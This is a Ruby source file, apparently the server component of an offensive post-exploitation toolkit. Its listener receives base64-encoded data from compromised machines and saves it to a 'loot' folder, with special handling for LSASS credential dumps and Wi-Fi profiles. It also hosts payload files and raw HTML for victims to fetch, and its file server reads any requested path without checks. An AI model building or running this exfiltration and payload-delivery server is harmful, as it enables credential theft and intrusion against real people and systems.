#!/usr/bin/env ruby
require 'socket'
require 'openssl'
require 'core'
require 'uri'
include Core::Commands
module Server
  class Setup
    include Core::Files
    def ssl(host, port)
      tcp_server = TCPServer.new(host, port)
      ctx = OpenSSL::SSL::SSLContext.new
      ctx.cert = OpenSSL::X509::Certificate.new(
        File.open("#{cert_dir}server.crt"))
      ctx.key = OpenSSL::PKey::RSA.new(File.open("#{cert_dir}server.key"))
      server = OpenSSL::SSL::SSLServer.new tcp_server, ctx
      server
    end

    def use_ssl?
      ssl = rgets('Use ssl? [t/f]: ',  't')
      ssl.downcase[0] == 't' ? true : false
    end

    def host
      host_name = rgets('Enter the host ip/url to listen on: ', 'localhost')
      print_success("Using #{host_name} as server")
      host_name
    end

    def port
      port = rgets('Enter the port you would like to use [443]: ', 443)
      until (1..65_535).cover?(port.to_i)
        print_error('Not a valid port')
        sleep(1)
      end
      print_success("Using #{port}")
      port
    end

    def uri
      rgets('Enter the URI: ', '')
    end

    def host_payload?
      choice = ''
      until choice.downcase[0] == 'y' || choice.downcase[0] == 'n'
        choice = rgets('Host payload? [y/n]: ', 'y')
      end
      choice.downcase[0] == 'y' ? true : false
    end

    def host_listener?
      choice = ''
      until choice.downcase[0] == 'y' || choice.downcase[0] == 'n'
        choice = rgets('Host listener? [y/n]: ', 'y')
      end
      choice.downcase[0] == 'y' ? true : false
    end
  end

  class Start
    include Core::Files
    def initialize(ssl, host, port)
      Dir.mkdir(loot_dir) unless Dir.exist?(loot_dir)
      if ssl
        Menu.opts[:banner][:host] = host
        Menu.opts[:banner][:ports] = port
        @server = Server::Setup.new.ssl(host, port.to_i)
        print_info("Starting SSL Server!\n")
      else
        Menu.opts[:banner][:host] = host
        Menu.opts[:banner][:ports] = port
        @server = TCPServer.open(port.to_i)
        print_info("Starting Server!\n")
      end
    end

    def listener(type = '')
      loop do
        Thread.start(@server.accept) do |client|
          print_info("Client Connected.\n")
          file_name = client.gets
          file_name.strip!
          print_success("Got #{file_name} file!\n")
          print_info("Getting Data\n")
          out_put = client.gets
          print_info("Writing to File\n")
          case type
          when 'lsass'
            final = "#{file_name}_#{_timestamp}.dmp"
          when 'wifi'
            final = "#{file_name}_#{_timestamp}.xml"
          else
            final = "#{file_name}_#{_timestamp}"
          end
          File.open("#{loot_dir}#{final}", 'w') do |f|
            f.write(Base64.decode64(out_put))
          end
          print_success("File Done!\n")
          client.close
        end
      end
    rescue => error
      print_error(error)
    end

    def host_file(path)
      time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
      loop do
        Thread.start(@server.accept) do |client|
          print_info("Client Connected.\n")
          request = client.gets
          request_uri = request.split(' ')[1]
          path = URI.unescape(URI(request_uri).path)
          if File.exist?(path) && !File.directory?(path)
            File.open(path) do |f|
              headers = ['HTTP/1.1 200 OK',
                         "Date: #{time}",
                         'Server: Ruby',
                         'Content-Type: applicaiton/octet-stream; charset=iso-8859-1',
                         "Content-Length: #{f.size}\r\n\r\n"].join("\r\n")
              client.print headers
              IO.copy_stream(f, client)
            end
          else
            message = "File not found\n"
            headers = ['HTTP/1.1 404 Not Found',
                       "Date: #{time}",
                       'Server: Ruby',
                       'Content-Type: text/plain; charset=iso-8859-1',
                       "Content-Length: #{message.size}\r\n\r\n"].join("\r\n")
            client.print headers
            client.print message
          end
          client.close
        end
      end
    end

    def host_raw(raw_string)
      time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
      loop do
        begin
          Thread.start(@server.accept) do |client|
            print_info("Client Connected!\n")
            headers = ['HTTP/1.1 200 OK',
                       "Date: #{time}",
                       'Server: Ruby',
                       'Content-Type: text/html; charset=iso-8859-1',
                       "Content-Length: #{raw_string.length}\r\n\r\n"].join("\r\n")
            client.print headers
            client.print "#{raw_string}\n"
            client.close
          end
        rescue => e
          puts e
        end
      end
    end

    private

    def _timestamp
      Time.now.strftime('%Y_%m_%d_%H_%M_%S')
    end
  end
end
